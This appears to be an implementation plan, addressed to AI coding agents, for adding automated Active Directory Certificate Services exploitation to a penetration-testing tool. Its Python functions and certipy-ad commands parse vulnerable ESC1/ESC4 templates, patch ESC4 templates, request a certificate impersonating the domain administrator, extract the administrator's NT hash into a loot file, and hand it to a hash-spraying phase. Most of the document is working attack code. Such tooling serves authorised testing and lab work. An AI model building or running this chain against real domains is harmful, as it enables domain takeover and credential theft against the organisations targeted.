# ADCS ESC Chain Automation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend creds mode so that detected ESC1/ESC4 certificate template vulnerabilities are automatically chained through `certipy-ad req` → `certipy-ad auth` → NT hash extraction, with the result fed into the existing cred-reuse phase.

**Architecture:** Two new helper functions added to `lib/credsmode.py` — `_parse_adcs_find()` to extract structured `(ca, template, esc_variant)` tuples from certipy output, and `_adcs_esc_chain()` to execute the req/auth chain — plus a targeted replacement of the existing 21-line certipy block in `_ad_core()` that calls them.

**Tech Stack:** Python 3.10+, certipy-ad CLI, existing `Runner`/`Workspace`/`Findings` infrastructure in `lib/`.

---

## File Map

| File | Change |
|---|---|
| `lib/credsmode.py` | Add `_parse_adcs_find()` at line ~35 (Helpers section); add `_adcs_esc_chain()` and `_adcs_esc4_restore()` after it; replace lines 304–324 in `_ad_core()` |

No new files. No other files touched.

---

### Task 1: Add `_parse_adcs_find()`

**Files:**
- Modify: `lib/credsmode.py` — insert after `_error_lines()` (currently ends ~line 34)

`_parse_adcs_find` walks `certipy-ad find -stdout -vulnerable` output line-by-line, tracking the current template name and its CA, and emits a tuple whenever it encounters an ESC1 or ESC4 vulnerability line.

- [ ] **Step 1: Insert the function**

Add after the `_error_lines()` function (after line 34 in `lib/credsmode.py`):

```python
def _parse_adcs_find(out: str) -> list[tuple[str, str, str]]:
    """Parse certipy-ad find -stdout output. Returns (ca_name, template_name, esc_variant) for ESC1/ESC4."""
    results: list[tuple[str, str, str]] = []
    current_template: str | None = None
    current_ca: str | None = None
    in_vulns = False

    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Template Name"):
            current_template = stripped.split(":", 1)[-1].strip()
            current_ca = None
            in_vulns = False
        elif stripped.startswith("Certificate Authorities") and ":" in stripped and current_template:
            current_ca = stripped.split(":", 1)[-1].strip()
        elif stripped.startswith("[!] Vulnerabilities"):
            in_vulns = True
        elif in_vulns and (stripped.startswith("ESC1") or stripped.startswith("ESC4")):
            esc = stripped.split(":")[0].strip()
            if current_template and current_ca:
                results.append((current_ca, current_template, esc))

    return results
```

- [ ] **Step 2: Verify parse logic manually**

The function must handle certipy-ad find output that looks like:

```
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    ...
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    ...
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

Trace through the logic: `Template Name` sets `current_template = "UserAuthentication"`, `Certificate Authorities : sequel-DC-CA` sets `current_ca = "sequel-DC-CA"` (only because `current_template` is set and the line contains `:`), `[!] Vulnerabilities` sets `in_vulns = True`, `ESC1 : ...` emits `("sequel-DC-CA", "UserAuthentication", "ESC1")`.

The top-level `Certificate Authorities` section header has no `:` on that line, so the guard `":" in stripped` prevents false matches.

- [ ] **Step 3: Commit**

```bash
git add lib/credsmode.py
git commit -m "feat: add _parse_adcs_find() to extract ESC1/ESC4 tuples from certipy output"
```

---

### Task 2: Add `_adcs_esc4_restore()` helper

**Files:**
- Modify: `lib/credsmode.py` — insert after `_parse_adcs_find()`

This is a small helper called from `_adcs_esc_chain()` in both the success and failure paths for ESC4, so extracting it avoids duplication.

- [ ] **Step 1: Insert the function**

Add directly after `_parse_adcs_find()`:

```python
def _adcs_esc4_restore(
    ip: str, domain: str, user: str, pw: str,
    template_name: str, backup_json: Path,
    runner: Runner, findings: Findings,
) -> None:
    restore_cmd = [
        "certipy-ad", "template",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-template", template_name,
        "-configuration", str(backup_json),
        "-dc-ip", ip,
    ]
    findings.cmd(" ".join(restore_cmd))
    runner.run(restore_cmd, f"adcs_esc4_restore_{template_name}", timeout=60)
    findings.note(f"ESC4: template {template_name} restored to original configuration")
```

- [ ] **Step 2: Commit**

```bash
git add lib/credsmode.py
git commit -m "feat: add _adcs_esc4_restore() helper"
```

---

### Task 3: Add `_adcs_esc_chain()`

**Files:**
- Modify: `lib/credsmode.py` — insert after `_adcs_esc4_restore()`

This is the core chain function. For ESC1 it runs req → auth → hash extraction. For ESC4 it prepends a template-patch step and appends a restore step.

- [ ] **Step 1: Insert the function**

Add directly after `_adcs_esc4_restore()`:

```python
def _adcs_esc_chain(
    ip: str, domain: str, user: str, pw: str,
    ca_name: str, template_name: str, esc_variant: str,
    runner: Runner, findings: Findings, ws: Workspace,
) -> None:
    """Run the certipy req → auth chain for an ESC1 or ESC4 vulnerable template."""
    exploit_dir = ws.exploit_dir
    pfx_path = exploit_dir / "administrator.pfx"

    findings.h4(f"ADCS {esc_variant}: {template_name}")

    # ── ESC4: patch template to make it ESC1-exploitable ─────────────────────
    if esc_variant == "ESC4":
        backup_json = exploit_dir / f"{template_name}_original.json"
        patch_cmd = [
            "certipy-ad", "template",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-template", template_name,
            "-save-old",
            "-dc-ip", ip,
        ]
        findings.cmd(" ".join(patch_cmd))
        out = runner.run(patch_cmd, f"adcs_esc4_patch_{template_name}", timeout=60)

        # certipy saves backup as <template>.json in CWD — move it to exploit/
        cwd_backup = Path(f"{template_name}.json")
        if cwd_backup.exists():
            cwd_backup.rename(backup_json)

        if not backup_json.exists():
            findings.note(f"ESC4 template patch failed — no backup JSON found: {_trim(out, lines=5)}")
            return

    # ── Request certificate as administrator ──────────────────────────────────
    req_cmd = [
        "certipy-ad", "req",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-ca", ca_name,
        "-template", template_name,
        "-upn", f"administrator@{domain}",
        "-dc-ip", ip,
        "-out", str(exploit_dir / "administrator"),
    ]
    findings.cmd(" ".join(req_cmd))
    out_req = runner.run(req_cmd, f"adcs_{esc_variant.lower()}_req_{template_name}", timeout=60)

    if not pfx_path.exists():
        findings.note(
            f"Certificate request failed for {template_name}: "
            f"{_error_lines(out_req) or _trim(out_req, lines=5)}"
        )
        if esc_variant == "ESC4":
            _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
        return

    findings.bullet(f"Certificate obtained → `{pfx_path.relative_to(ws.machine_dir)}`")

    # ── Authenticate with PFX → NT hash ──────────────────────────────────────
    auth_cmd = [
        "certipy-ad", "auth",
        "-pfx", str(pfx_path),
        "-dc-ip", ip,
        "-domain", domain,
        "-username", "administrator",
    ]
    findings.cmd(" ".join(auth_cmd))
    out_auth = runner.run(auth_cmd, f"adcs_{esc_variant.lower()}_auth_{template_name}", timeout=60)

    nt_hash: str | None = None
    for line in out_auth.splitlines():
        m = re.search(r"Got hash for .+?:\s*[0-9a-fA-F:]+:([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
            break

    if nt_hash:
        ws.append_hash_file("ntlm.hash", [f"administrator:{nt_hash}"])
        ws.add_cred(f"administrator:{nt_hash}")
        findings.bullet(f"**NT hash for administrator:** `{nt_hash}`")
        findings.bullet("Hash saved to `loot/ntlm.hash` — cred-reuse phase will spray it")
        findings.add_summary(f"**ADCS {esc_variant} → administrator NT hash** in `loot/ntlm.hash`")
        print(f"    [+] ADCS {esc_variant}: administrator NT hash obtained")
    else:
        findings.note(f"Auth step ran but no NT hash parsed: {_trim(out_auth, lines=10)}")
        print(f"    [!] ADCS {esc_variant}: auth ran but NT hash not found in output")

    # ── ESC4: restore template ────────────────────────────────────────────────
    if esc_variant == "ESC4":
        _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
```

- [ ] **Step 2: Commit**

```bash
git add lib/credsmode.py
git commit -m "feat: add _adcs_esc_chain() for ESC1/ESC4 cert request and auth"
```

---

### Task 4: Replace the certipy block in `_ad_core()`

**Files:**
- Modify: `lib/credsmode.py` lines 304–324 — replace the existing `# 5. ADCS template enumeration` block

- [ ] **Step 1: Replace the block**

Replace lines 304–324 (the existing `# 5. ADCS template enumeration` block) with:

```python
    # 5. ADCS template enumeration
    if "certipy-ad" in available:
        cmd = [
            "certipy-ad", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", ip,
            "-stdout",
            "-vulnerable",
        ]
        print(f"    [*] ADCS (certipy-ad)...")
        findings.h4("ADCS Templates (certipy-ad)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_certipy", timeout=120)
        findings.code_block(_trim(out))

        vuln_templates = _parse_adcs_find(out)
        if vuln_templates:
            for ca_name, tmpl, esc in vuln_templates:
                findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
            print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — running chain")
            for ca_name, tmpl, esc in vuln_templates:
                _adcs_esc_chain(ip, domain, user, pw, ca_name, tmpl, esc, runner, findings, ws)
        elif "ESC" in out:
            for line in out.splitlines():
                if "ESC" in line:
                    findings.add_summary(f"ADCS vuln: {line.strip()}")
            print(f"    [+] Vulnerable ADCS templates found (unparsed)")
        else:
            print(f"    [-] No vulnerable ADCS templates")
```

- [ ] **Step 2: Verify the edit looks right**

Run a quick syntax check:

```bash
python3 -c "import lib.credsmode; print('OK')"
```

Expected: `OK`

- [ ] **Step 3: Commit**

```bash
git add lib/credsmode.py
git commit -m "feat: wire ADCS ESC1/ESC4 chain into creds mode _ad_core()"
```

---

## Verification

On a real AD target with a vulnerable ADCS template (or re-running against a cached workspace):

1. Run creds mode: `sudo python3 p0rtix.py <ip> --domain <domain> --mode creds -u <user> -p <pass>`
2. Check `findings.md` — confirm "ADCS Templates (certipy-ad)" section shows the find output, followed by an "ADCS ESC1: `<template>`" sub-section with req/auth commands and a `**NT hash for administrator:**` bullet.
3. Check `loot/ntlm.hash` — confirm `administrator:<hash>` present.
4. Check `loot/creds_found.txt` — confirm `administrator:<hash>` present.
5. Confirm cred-reuse phase (later in output) shows nxc spraying the hash against SMB/WinRM.
6. For ESC4: confirm a subsequent `certipy-ad find` run shows the template no longer has ESC4, and `exploit/<template>_original.json` exists in the workspace.
